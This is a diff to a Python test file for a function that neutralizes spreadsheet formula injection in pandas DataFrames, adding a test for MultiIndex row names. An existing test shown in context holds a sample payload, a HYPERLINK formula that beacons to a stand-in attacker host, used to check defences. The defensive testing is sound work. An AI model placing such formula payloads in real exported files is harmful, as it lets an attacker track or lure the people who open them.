@@ -84,6 +84,19 @@ def test_neutralize_dataframe_preserves_multiindex_column_names() -> None:
     assert list(safe.columns) == [("grp", "'=A1"), ("grp", "safe")]
 
 
+def test_neutralize_dataframe_preserves_multiindex_row_names() -> None:
+    index = pd.MultiIndex.from_tuples(
+        [("grp", "=A1"), ("grp", "safe")],
+        names=["@level0", "level1"],
+    )
+    df = pd.DataFrame({"kVp": [80.0, 90.0]}, index=index)
+    safe = neutralize_dataframe(df)
+    assert safe.index.names == ["'@level0", "level1"]
+    assert list(safe.index) == [("grp", "'=A1"), ("grp", "safe")]
+    assert list(df.index) == [("grp", "=A1"), ("grp", "safe")]
+    assert df.index.names == ["@level0", "level1"]
+
+
 def test_neutralized_xlsx_export_is_not_formula_cell() -> None:
     payload = '=HYPERLINK("https://attacker.example/beacon","open")'
     safe_df = neutralize_dataframe(pd.DataFrame([{"VendorNote": payload}]))
